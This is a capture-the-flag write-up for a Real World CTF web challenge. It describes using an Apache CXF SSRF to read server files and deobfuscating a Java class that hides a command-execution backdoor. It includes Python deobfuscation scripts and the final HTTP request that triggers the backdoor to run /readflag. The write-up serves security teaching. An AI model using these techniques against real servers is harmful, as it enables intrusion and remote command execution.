# The Dark Portal&emsp;<sub><sup>Web, 304 points</sup></sub>

_Writeup by [@bluepichu](https://github.com/bluepichu), [@nneonneo](https://github.com/nneonneo), and [@f0xtr0t](https://github.com/jaybosamiya)_

> "The dark portal is fulfilled with unlimited chaos, twisted runes, and endless darkness, you shall follow the guidance of your mentor Apache.CXF to find it. Then, try your best to pass through..."

This challenge has no source download, so all we have to go on is the description and the service itself.  The service appears to be a static page with two links:

- One links to a WSDL file that describes a very simple API.
- The other goes to "the front of the dark portal", a page that makes a request to `/7he_d4rk_p0rt4l` and inserts it onto the page.

Since the description and service both mention Apache CXF and we've been linked to a WSDL file, the first thing we did was to set up a simple client to use the `showMe` endpoint from the `GuidanceService`.  Unfortunately, it didn't seem to be anything beyond a simple echo service.

We poked around a bit more, but it appeared that the guidance service was the only one running, so we switched into recon mode and searched for any known Apache CXF exploits.  Pretty quickly, we came across a CVE that sounded promising: [an SSRF vulnerability](https://www.cvedetails.com/cve/CVE-2022-46364/) that can be exploited on any endpoint that takes at least one parameter.  After fumbling around a bit, trying to figure out how to make XOP work, we were able to confirm that the service was indeed vulnerable to this attack by making the service send a request to itself.

Now armed with an SSRF, we whipped up two quick scripts ([one in JS](./download.js) and [one in Python](./explore.py), both approximately equivalent) to simplify the process of sending requests.  We then poked around at the endpoints we knew about for a while, but were unable to find any that acted differently when responding to a request from `localhost`.

Eventually though, we had the idea of switching protocols, and tried `file:///etc/passwd` — and were surprised to find that it worked!  Further, requesting a path that was a directory would actually returning a listing, making it very easy to navigate the filesystem.  This told us that the flag was at `/flag`, but unfortunately could only be read via the `/readflag` binary, so we'd need an RCE to actually get it.  However, we could now finally get our hands on the server; after a bit of searching, we were able to locate the `.class` files powering the server in `/opt/tomcat/webapps/ROOT/WEB-INF/classes/com/rw/rwctf2023/`. See [`./dumped_from_server/`](./dumped_from_server/) for files we got from the server.

[`GuidanceService.class`](./dumped_from_server/GuidanceService.class), [`GuidanceServiceImpl.class`](./dumped_from_server/GuidanceServiceImpl.class), and [`TheDarkPortal.class`](./dumped_from_server/TheDarkPortal.class) were all pretty straightforward, though the latter simply delegated to `DarkMagic.class`. [`DarkMagic.class`](./dumped_from_server/DarkMagic.class), on the other hand, was anything but straightforward — it was _heavily_ obfuscated, to the point that some tools we tried more or less refused to work with it at all.

Our first attempt at decompiling was to throw the program into JADX. However, JADX threw tons of errors like `JADX ERROR: Failed to decode insn: 0x00A8: INVOKE_CUSTOM r2, r3, r0, method: com.rw.rwctf2023.DarkMagic.invoke(javax.servlet.http.HttpServletRequest, javax.servlet.http.HttpServletResponse):void`. Looking at the bytecode, it seemed like JADX lacked full support for the `invokedynamic` bytecode that was being used in several methods. Instead, we chose to use the [Procyon decompiler](https://github.com/mstrobel/procyon/wiki/Java-Decompiler), using `procyon -b`, to generate a bytecode AST instead of a full decompilation (since Procyon's full decompiler crashed on this file too). This generates code like the following:

```
        while (cmpeq:boolean(xor:long(ldc:long(-5776055408742711432L), ldc:long(6071269665789389157L)), ldc:long(2009174849371701793L))) {
            if (cmpeq:boolean(xor:long(ldc:long(5043742198095095470L), ldc:long(6504919793824818712L)), ldc:long(7590057882053757461L))) {
                if (cmpne:boolean(xor:long(ldc:long(2361941958013382122L), ldc:long(-3360122806132908369L)), ldc:long(-1037728222278044859L))) {
                }
                
                athrow(initobject:RuntimeException(RuntimeException::<init>, invokedynamic:String(invokestatic com/rw/rwctf2023/DarkMagic.
{
III
{I
I
{{{{I{I{I{{{
{:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/Object;, I
II{{
{
{
{{{
I
I{
{{{{I
{
I:(IJ)Ljava/lang/String;, ldc:boolean(0), ldc:long(-1787229411635844802L))))
            }
        }
```

The ugly method names `{\nIII\n...` make parsing this file hard, so we wrote a little [Hachoir](https://pypi.org/project/hachoir/) script to sanitize the offending method names:

```python
from hachoir.stream import FileInputStream
from hachoir.parser.program.java import JavaCompiledClassFile
from hashlib import sha256

data = bytearray(open("DarkMagic.class", "rb").read())
p = JavaCompiledClassFile(FileInputStream("DarkMagic.class"))
print(p)
index = 0
for cp in p["constant_pool"]:
    if cp["tag"].display == "Utf8":
        v = cp["bytes"].value
        if len(v) > 8 and all(c in "{\nI" for c in v):
            off = cp["bytes"].absolute_address // 8 + 2
            data[off:off + len(v)] = ("v%04d_" % index + sha256(v.encode()).hexdigest()[:len(v) - 6]).encode()
            index += 1

with open("DarkMagic_deobf.class", "wb") as outf:
    outf.write(data)
```

This generated [`./DarkMagic_deobf.class`](./DarkMagic_deobf.class), upon which running `procyon -b` produces output that looks a bit more reasonable:

```
while (cmpeq:boolean(xor:long(ldc:long(-5776055408742711432L), ldc:long(6071269665789389157L)), ldc:long(2009174849371701793L))) {
    if (cmpeq:boolean(xor:long(ldc:long(5043742198095095470L), ldc:long(6504919793824818712L)), ldc:long(7590057882053757461L))) {
        if (cmpne:boolean(xor:long(ldc:long(2361941958013382122L), ldc:long(-3360122806132908369L)), ldc:long(-1037728222278044859L))) {
        }
        
        athrow(initobject:RuntimeException(RuntimeException::<init>, invokedynamic:String(invokestatic com/rw/rwctf2023/DarkMagic.v0007_1c4783e5646d75c310ec:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/Object;, v0008_2ad70a1a049072cc8ce1bb4:(IJ)Ljava/lang/String;, ldc:boolean(0), ldc:long(-1787229411635844802L))))
    }
}
```

We realized that the code was chock full of useless `while` loops that looked like this, so we wrote a small [Comby](https://comby.dev/) command to get rid of this and other useless constructs:

```
comby -i -matcher .generic 'try { :[_] } catch (:[_]) { :[_] } catch (:[_]) { :[_] } finally { :[_] }' '' DarkMagic.procyon
comby -i -matcher .generic 'while (cmpeq:boolean(xor:long(ldc:long(:[_]), ldc:long(:[_])), ldc:long(:[_]))) { :[_] }' '' DarkMagic.procyon
```

Our cleaned-up bytecode AST at this point can be found in [`darkmagic.procyon`](darkmagic.procyon). We see code like this:

```
stack_14B_1 = invokedynamic:String(invokestatic com/rw/rwctf2023/DarkMagic.v0007_1c4783e5646d75c310ec:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/Object;, v0012_329d026617ed4a56be8f75:(IJ)Ljava/lang/String;, ldc:int(4), xor:long(ldc:long(-1787229411635844770L), ldc:long(96L)))
var_2_150 = invokedynamic:String(invokestatic com/rw/rwctf2023/DarkMagic.v0014_0cc215bba1599024528ec63:(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;, v0015_b205c609eafdff457066fa:(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/String;-762998362, "gj40\u0003E\u001ayu\u0018an6\u007f\u0013\u001f\u001dl)&y\u007f2\u0002\u001e\u0019\u001fpb\u001a_n3$\u001e\u0018\u001d", "jn6\u0019\u001e\n\ryu", "%G(0\r\nFpf\u0000j$\u0011%\t\u0002\u0007{<GAa#'\u001aD\u0005}i\t\"X6#\u0012\u0005\u000e'", "\r\u000bBQ{ki\u001c\u0007n", -0.3209290027032314, "SUl7CnsKSQpJCklJCnsKSQpJCklJCnsKSUlJSXsKSQ==", -973062941, 0.5895415f, "CkkKewpJCkl7Cnt7SQp7Cnt7SQpJCklJe3sKSQp7SQ==", p0:HttpServletRequest, stack_14B_1:String)
var_3_230 = invokedynamic:String(invokestatic com/rw/rwctf2023/DarkMagic.v0014_0cc215bba1599024528ec63:(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;, v0021_e9d737d5564dbcd86bce2:(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/String;-762998362, "gj40\u0003E\u001ayu\u0018an6\u007f\u0013\u001f\u001dl)&y\u007f2\u0002\u001e\u0019\u001fpb\u001a_n3$\u001e\u0018\u001d", "jn6\u0019\u001e\n\ryu", "%G(0\r\nFpf\u0000j$\u0011%\t\u0002\u0007{<GAa#'\u001aD\u0005}i\t\"X6#\u0012\u0005\u000e'", "\r\u000bBQ{ki\u001c\u0007n", 56422108, "CkkKe3sKSQpJCnt7CnsKSQpJe3sKewp7Ckl7CnsKewp7Cns=", 17.323252101580987, "v0020_470905c722d1b00f869d0", "CnsKSUl7CklJCkkKe3t7SQp7ewpJCkl7SXt7ew==", p0:HttpServletRequest, invokedynamic:String(invokestatic com/rw/rwctf2023/DarkMagic.v0007_1c4783e5646d75c310ec:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/Object;, v0019_6696441e5574b57213d3b5c80c:(IJ)Ljava/lang/String;, ldc:int(9), xor:long(ldc:long(-1787229411635844770L), ldc:long(96L))))
stack_28A_0 = invokedynamic:String(invokestatic com/rw/rwctf2023/DarkMagic.v0014_0cc215bba1599024528ec63:(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;, v0023_24b39c88eeb7e44e409f4cc2:(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/String;-762998362, "gj40\u0003E\u001ayu\u0018an6\u007f\u0013\u001f\u001dl)&y\u007f2\u0002\u001e\u0019\u001fpb\u001a_n3$\u001e\u0018\u001d", "jn6\u0001\u001a\u0019\bqb\u001ahy", "%G(0\r\nFpf\u0000j$\u0011%\t\u0002\u0007{<GAa#'\u001aD\u0005}i\t\"X6#\u0012\u0005\u000e'", "\r\u000bBQ{ki\u001c\u0007n", -0.4611429066827669, 0.9339672f, 13.915274120771059, -2083003130, 38, p0:HttpServletRequest, invokedynamic:String(invokestatic com/rw/rwctf2023/DarkMagic.v0007_1c4783e5646d75c310ec:(Ljava/lang/invoke/MethodHandles$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;)Ljava/lang/Object;, v0022_f708bde6518070b98734c8e865:(IJ)Ljava/lang/String;, ldc:int(10), xor:long(ldc:long(-1787229411635844770L), ldc:long(96L))))
```

We noticed that there were two different `invokedynamic` calls: one to `DarkMagic.v0007_1c4783e5646d75c310ec` with a few arguments, and one to `DarkMagic.v0014_0cc215bba1599024528ec63` with a lot more arguments. Looking at the `v0007_1c4783e5646d75c310ec` function, we can see that it just forwards to the `v0182_b11b5b2ea78b5c191b53126d` method using a MutableCallSite. `v0182_b11b5b2ea78b5c191b53126d`, on the other hand, uses some DES cipher stuff to decrypt and return a string - from this, we can infer that the `v0007_1c4783e5646d75c310ec` calls are responsible for providing some form of string encryption. The encrypted strings are sourced from the `v0005_27759afbd4d1d8bb8a5777d` array, which is initialized in `v0156_ddf31117bc14aeded65c06`. We dumped the base64-encoded array to [`strings.txt`](strings.txt) and reimplemented the decryption routine in a few lines of Python, recovering the necessary key argument from the (constant) final argument to every `invokedynamic v0007_1c4783e5646d75c310ec` operation.

Next, the `v0014_0cc215bba1599024528ec63` method takes 13 parameters, but actually only uses five of them (p3 through p7). It treats `p7` as an XOR encryption key and uses it to decrypt the strings `p4` through `p6`, which are then used as the class, method name and method signature respectively to look up the real method to call.

We can combine our string decryption routine and some ugly regular expressions to deobfuscate everything in one go ([`deobfuscate.py`](deobfuscate.py)):

```python
import re
from ast import literal_eval

import base64
from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad
import struct

p1 = 4557847193904795529 ^ -1787229411635844770
mapping = {}
for p0, row in enumerate(open("strings.txt")):
    key = bytearray([0] * 8)
    key[0] = (p1 >> 56) & 0xff
    for i in range(1, 8):
        key[i] = (((p1 << (i * 8)) >> 56) << (p0 & 63)) & 0xff

    res = DES.new(key, mode=DES.MODE_CBC, iv=b"\0" * 8).decrypt(base64.b64decode(row))
    mapping[p0] = unpad(res, 8).decode()

code = open("darkmagic.procyon", "r").read()
code = code.replace("xor:long(ldc:long(-1787229411635844770L), ldc:long(96L))", "ldc:long(-1787229411635844802L)")
code = re.sub(r"and:int\((ldc:int\(\d+\)), ldc:int\(-1\)\)", r"\1", code)
code = re.sub(
    r"invokedynamic:String\(invokestatic com/rw/rwctf2023/DarkMagic.v0007_1c4783e5646d75c310ec:\(Ljava/lang/invoke/MethodHandles\$Lookup;Ljava/lang/String;Ljava/lang/invoke/MethodType;\)Ljava/lang/Object;, [^,]+, ldc:int\((\d+)\), ldc:long\(-1787229411635844802L\)\)",
    lambda m: '"' + mapping[int(m.group(1))] + '"',
    code)
code = code.replace(r'\"', r'\u0022')
def xor(x, key):
    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(x))
def decrypt_v0014(m):
    key = literal_eval(m.group(6))
    cls = xor(literal_eval(m.group(3)), key)
    meth = xor(literal_eval(m.group(4)), key)
    sig = xor(literal_eval(m.group(5)), key)
    return f"{cls}::{meth}("
code = re.sub(
    r"""invokedynamic:[^(]+\(invokestatic com/rw/rwctf2023/DarkMagic.v0014_0cc215bba1599024528ec63:\(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/String;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;\)Ljava/lang/Object;, \w+:([^-]+)("[^"]+"|[^,]+), ("[^"]+"|[^,]+), ("[^"]+"|[^,]+), ("[^"]+"|[^,]+), ("[^"]+"|[^,]+), ("[^"]+"|[^,]+), ("[^"]+"|[^,]+), ("[^"]+"|[^,]+), ("[^"]+"|[^,]+), ("[^"]+"|[^,]+)(, )?""",
    decrypt_v0014,
    code)

with open("darkmagic-deobfuscated.procyon", "w") as outf:
    outf.write(code)
```

This produced some [very nice output](darkmagic-deobfuscated.procyon):

```
stack_14B_1 = "cmd"
var_2_150 = javax.servlet.http.HttpServletRequest::getHeader(p0:HttpServletRequest, stack_14B_1:String)
var_3_230 = javax.servlet.http.HttpServletRequest::getHeader(p0:HttpServletRequest, "User-Agent")
stack_28A_0 = javax.servlet.http.HttpServletRequest::getParameter(p0:HttpServletRequest, "curses")
```

We also had written a few more comby commands that improved the output [even more](./darkmagic-deobfuscated-qol-improvements.procyon), mostly for minor quality-of-life improvements while we were still reading the code.

With all of this deobfuscation complete, we could see that the `/7he_d4rk_p0rt4l` was doing a few checks, and if they all succeeded then it would execute any command you gave it:

- The `cmd` header must not be empty (and will be executed if the other checks succeed)
- The `User-Agent` must be set to `The Argent Dawn`
- The `curses` query parameter must be equal to `base64(hmacsha256("Victory or death!", "Lok-tar ogar"))`

Many minutes of fumbling around with urlencoding later (oops), we had a flag!

```
GET /7he_d4rk_p0rt4l?curses=5IKRjJICv2BPpCEGG1TF5o%2bZ6aCHqifjjvlQVJa7vOI%3D
Host: 198.11.177.96:30165
User-Agent: The Argent Dawn
cmd: /readflag

HTTP/1.1 200
Content-Length: 39

rwctf{rwctf_N0w_y0u_4RE_prep4red_17a0}
```
